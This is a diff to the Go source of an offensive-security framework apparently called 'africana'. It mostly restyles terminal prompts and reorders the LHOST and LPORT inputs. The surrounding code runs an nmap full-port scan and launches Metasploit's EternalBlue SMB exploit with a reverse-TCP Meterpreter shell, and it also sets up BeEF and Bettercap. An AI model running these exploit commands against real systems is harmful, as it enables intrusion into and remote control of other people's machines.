@@ -28,7 +28,7 @@ func InternalScanner() {
 }
 
 func NmapPortscan(userTarget string) {
-    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing port scan:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
+    fmt.Printf(bcolors.BLUE + "\n[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing: " + bcolors.RED + bcolors.ITALIC + "PORT scan " + bcolors.DARKGREEN + "Target " + bcolors.PURPLE + "set to: " + bcolors.ORANGE + bcolors.ITALIC + "%s 🐾" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC, userTarget)
     Logs := fmt.Sprintf("/root/.africana/logs/nmap_full_ports_log_%s.txt", time.Now().Format("20060102_150405"))
     subprocess.PopenThree(`script -q -c 'nmap -v -p- %s' -O %s`, userTarget, Logs)
     fmt.Println()
@@ -72,26 +72,27 @@ func SmbExploit(userTarget string) {
         case "0":
             return
         case "1":
-            fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "Lport:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "9999" + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
+            fmt.Println()
+            subprocess.Popen(`ip address`)
+            fmt.Println()
+            fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             reader := bufio.NewReader(os.Stdin)
+            userLhost, _ := reader.ReadString('\n')
+            userLhost = strings.TrimSpace(userLhost)
+            if userLhost == "" {
+                userLhost = userLhostIp
+            }
+            fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             userLport, _ := reader.ReadString('\n')
             userLport = strings.TrimSpace(userLport)
             if userLport == "" {
                 userLport = "9999"
             }
             fmt.Println()
-            subprocess.Popen(`ip address`)
-            fmt.Println()
-            fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.BLUE + ")\n" + bcolors.ENDC)
-            fmt.Printf(bcolors.BLUE + "╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-            userLhost, _ := reader.ReadString('\n')
-            userLhost = strings.TrimSpace(userLhost)
-            if userLhost == "" {
-                userLhost = userLhostIp
-            }
-            fmt.Println()
             subprocess.PopenFour(`msfdb start; msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j"`, userTarget, userLhost, userLport)
+            fmt.Println()
         case "99", "m", "M", "menu", "Menu", "MENU":
             menus.MenuThreeOne()
         case "00", "h", "H", "help", "Help", "HELP":
@@ -138,7 +139,7 @@ func PacketsResponder() {
         fmt.Println()
         subprocess.Popen(`ip address`)
         fmt.Println()
-        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.BLUE + ")\n" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
         fmt.Printf(bcolors.BLUE + "╰─🐷" + bcolors.GREEN + "❯ " + bcolors.ENDC)
         reader := bufio.NewReader(os.Stdin)
         userLhost, _ := reader.ReadString('\n')
@@ -184,7 +185,8 @@ func BeefBettercap(userTarget string) {
     case "1":
         backUp := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(backUp); os.IsNotExist(err) {
-            fmt.Print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "Type new password for the beef user:" + bcolors.GREEN + ")# " + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "Type new password for the beef user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             fmt.Scan(&userPass)
             fmt.Println()
             filePath := "/etc/beef-xss/config.yaml"
@@ -210,7 +212,7 @@ func BeefBettercap(userTarget string) {
         fmt.Println()
         subprocess.Popen(`ip address`)
         fmt.Println()
-        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.BLUE + ")\n" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
         fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
         reader := bufio.NewReader(os.Stdin)
         userLhost, _ := reader.ReadString('\n')
@@ -226,7 +228,8 @@ func BeefBettercap(userTarget string) {
     case "2":
         backUp := "/etc/beef-xss/config.yaml.bak_africana"
         if _, err := os.Stat(backUp); os.IsNotExist(err) {
-            fmt.Print(bcolors.GREEN + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "Type new password for the beef user:" + bcolors.GREEN + ")# " + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "Type new password for the beef user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
+            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
             fmt.Scan(&userPass)
             fmt.Println()
             filePath := "/etc/beef-xss/config.yaml"
@@ -252,7 +255,7 @@ func BeefBettercap(userTarget string) {
         fmt.Println()
         subprocess.Popen(`ip address`)
         fmt.Println()
-        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "Lhost:" + bcolors.BLUE + "Default:" + bcolors.YELLOW + "%s", userLhostIp + bcolors.BLUE + ")\n" + bcolors.ENDC)
+        fmt.Printf(bcolors.BLUE + "╭─" + bcolors.BLUE + "(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
         fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
         reader := bufio.NewReader(os.Stdin)
         userLhost, _ := reader.ReadString('\n')
